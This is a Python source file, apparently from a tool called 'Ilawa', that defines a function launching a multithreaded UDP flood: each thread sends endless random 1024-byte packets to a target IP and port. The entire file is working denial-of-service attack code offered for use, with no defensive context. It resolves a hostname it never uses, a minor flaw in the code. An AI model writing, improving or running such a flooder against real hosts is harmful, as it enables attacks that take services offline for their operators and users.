import requests
import threading
from urllib.parse import urlparse
import socket
import time
import random

def enableAttack(ip, port, threadsCount, cooldown, userAgent):
    parsingResults = urlparse(ip)
    ipAdd = socket.gethostbyname(parsingResults.path)

    def attack(ip=ip, port=port, cooldown=cooldown, userAgent=userAgent):
        while True:
            try:
                data = random._urandom(1024)
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                adress = (str(ip), int(port))
                s.sendto(data, adress)

                time.sleep(cooldown/1000)
            
            except:
                print("Ilawa.attack >> Some error ocurred")
                quit()
    
    threads = []
    
    for _ in range(threadsCount):
        thr = threading.Thread(target=attack) #tf tf
        thr.start()
        threads.append(thr)

    for thread in threads:
        thread.join()